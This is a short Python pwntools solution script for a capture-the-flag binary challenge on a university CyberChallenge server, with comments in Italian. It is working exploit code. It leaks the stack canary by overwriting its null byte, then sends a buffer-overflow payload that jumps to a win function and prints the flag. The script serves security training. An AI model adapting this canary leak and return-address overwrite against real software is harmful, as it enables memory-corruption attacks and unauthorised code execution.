from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9005

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

offset = 72
win_function_address = 0x00000000004011a6

# Aggiungo un \n che andrà a sostituire il null iniziale il canary
# Ciò porterà il sistema a stampare il canary usato
payload = b"A" * offset + b"\n"

conn.recvuntil(b"?\n")
conn.send(payload)

# Recupero il canary, aggiungendo il null rimosso in precedenza
conn.recvline()
canary = b"\x00" + conn.recv(7)
canary = int.from_bytes(canary, "little")
print("CANARY: ", hex(canary))

payload = b"A" * offset + p64(canary) + b"b" * 8 + p64(win_function_address)

conn.recvuntil(b"?\n")
conn.sendline(payload)

conn.recvuntil(b"flag: ")
flag = conn.recvline(keepends=False).decode()

conn.close()
print(flag)